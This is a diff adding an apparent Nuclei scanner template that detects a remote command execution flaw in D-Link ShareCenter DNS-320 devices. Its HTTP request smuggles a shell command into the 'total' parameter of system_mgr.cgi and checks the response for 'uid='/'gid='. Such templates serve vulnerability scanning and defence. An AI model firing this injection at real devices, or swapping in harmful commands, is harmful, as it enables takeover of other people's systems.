@@ -1,0 +1,22 @@
+id: d-link-sharecenter-dns320-rce
+info:
+  name: D-Link ShareCenter DNS-320 system_mgr.cgi RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    D-Link ShareCenter DNS-320 system_mgr.cgi contains a remote command execution vulnerability. An attacker can exploit this to gain control of the server.
+  reference:
+    - http://wiki.peiqi.tech
+http:
+  - raw:
+      - |
+        GET /cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;id; HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+        part: body
